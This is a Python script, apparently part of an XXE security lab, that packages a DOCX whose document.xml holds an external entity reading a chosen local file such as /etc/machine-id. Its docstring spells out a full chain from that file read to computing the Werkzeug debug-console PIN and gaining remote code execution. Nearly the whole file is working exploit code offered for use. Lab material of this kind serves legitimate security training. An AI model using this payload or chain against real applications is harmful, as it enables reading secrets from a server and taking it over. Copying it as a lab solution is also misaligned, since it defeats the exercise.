"""
Build a malicious DOCX for the XXE lab (Compliance Report import).

Usage:
    python tests/build_xxe_docx.py                       # default: reads /etc/machine-id
    python tests/build_xxe_docx.py /etc/hostname         # read any local file
    python tests/build_xxe_docx.py /app/app.py exploit_appsrc.docx

The resulting .docx is a valid-enough OOXML package for python-docx-style
parsers that only touch word/document.xml, which is what the vulnerable
/admin/compliance/import endpoint does.

Exploit chain this feeds:
    upload .docx  ->  XXE reads a local file  ->  content surfaces in the
    "extracted_text" JSON and on the admin Compliance panel  ->  harvest
    /etc/machine-id, /sys/class/net/eth0/address, /proc/self/cgroup, and the
    absolute path to app.py to compute the Werkzeug debug-console PIN  ->
    /console  ->  RCE.
"""
import sys
import zipfile
from pathlib import Path

CONTENT_TYPES_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
"""

RELS_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
"""

DOCUMENT_XML_TEMPLATE = """<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target}">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>---BEGIN XXE---</w:t></w:r></w:p>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
    <w:p><w:r><w:t>---END XXE---</w:t></w:r></w:p>
  </w:body>
</w:document>
"""


def build(target_path: str, output: str) -> None:
    document_xml = DOCUMENT_XML_TEMPLATE.format(target=target_path)
    out = Path(output)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", CONTENT_TYPES_XML)
        z.writestr("_rels/.rels", RELS_XML)
        z.writestr("word/document.xml", document_xml)
    print(f"[+] Wrote {out}  (reads file://{target_path})")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/machine-id"
    output = sys.argv[2] if len(sys.argv) > 2 else "exploit.docx"
    build(target, output)
